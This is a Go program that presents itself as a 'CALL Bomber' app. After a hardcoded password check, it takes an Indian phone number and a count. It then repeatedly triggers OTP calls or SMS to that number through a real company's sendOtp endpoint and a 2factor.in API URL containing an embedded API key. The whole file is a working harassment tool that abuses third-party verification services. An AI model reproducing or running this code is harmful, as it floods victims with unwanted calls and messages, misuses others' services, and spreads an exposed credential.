package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"time"
)

func pauses(top string, code int) {
	log.Println(top)
	fmt.Println("Press Enter to exit ...")
	_, _ = fmt.Scanln()
	os.Exit(code)
}

func main() {
	var pass string
	fmt.Print("Enter the password to use:\n")
	if _, err := fmt.Scan(&pass); err != nil {
		pauses(err.Error(), 1)
	}
	if pass != "heck" {
		pauses("Password is incorrect!", 1)
	}
	cmd := exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	err := cmd.Run()
	if err != nil {
		pauses(err.Error(), 1)
	}
	log.Println("Hello!\nI'm a CALL Bomber app made in Golang :)\n\nChecking Internet ...")
	get, err := http.Get("https://www.google.com")
	if err != nil {
		pauses(err.Error(), 1)
	}
	_ = get.Body.Close()
	log.Println("Connection was Success to internet!")
	var phoneNumber string
	fmt.Print("Enter phone number without the international code and no spaces in between, you would like to CALL BOMB:\n")
	if _, err = fmt.Scan(&phoneNumber); err != nil {
		pauses(err.Error(), 1)
	}
	if len(phoneNumber) != 10 {
		pauses("Please enter 10 digits indian phone number only!", 1)
	}
	var times int
	fmt.Print("Enter the amount of times in number you would like to CALL BOMB, Enter 0 to skip:\n")
	if _, err = fmt.Scan(&times); err != nil {
		pauses(err.Error(), 1)
	}
	var typeofc int
	fmt.Print("Enter the type of call you would like to BOMB; Enter 1 or 2, 1 is using post and 2 is using get method:\n")
	if _, err = fmt.Scan(&typeofc); err != nil {
		pauses(err.Error(), 1)
	}
	log.Printf("Starting CALL BOMB; Please wait for %d seconds ...\n", times*15)
	if typeofc == 1 {
		for i := 0; i < times; i++ {
			postData, _ := json.Marshal(map[string]string{"phone": phoneNumber})
			req, _ := http.NewRequest("POST", "https://server.elitewin.in/sendOtp", bytes.NewBuffer(postData))
			req.Header.Set("Host", "server.elitewin.in")
			req.Header.Set("Accept", "application/json, text/plain, */*")
			req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0")
			req.Header.Set("Content-Type", "application/json")
			client := &http.Client{}
			resp, err := client.Do(req)
			if err != nil {
				pauses(err.Error(), 1)
			}
			_ = resp.Body.Close()
			time.Sleep(15 * time.Second)
		}
	} else if typeofc == 2 {
		for i := 0; i < times; i++ {
			resp, err := http.Get(fmt.Sprintf("https://2factor.in/API/V1/49e550ce-304d-11ee-addf-0200cd936042/SMS/+91%s/AUTOGEN/ELITEW", phoneNumber))
			if err != nil {
				pauses(err.Error(), 1)
			}
			_ = resp.Body.Close()
			time.Sleep(15 * time.Second)
		}
	} else {
		pauses("Please enter 1 or 2 in type!", 1)
	}
	pauses("Success!\nBye!", 0)
}
